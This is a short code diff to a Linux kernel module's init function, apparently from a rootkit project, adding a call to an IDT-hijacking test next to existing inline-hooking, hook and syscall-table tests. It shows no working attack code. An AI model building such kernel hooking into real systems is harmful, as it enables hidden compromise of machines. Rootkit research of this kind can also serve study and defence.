@@ -21,6 +21,7 @@ static int __init rootkit_init_module(void)
     test_inline_hooking();
     test_hook();
     test_syscall_tbl();
+    test_idt_hijacking();
 
     return 0;
 }
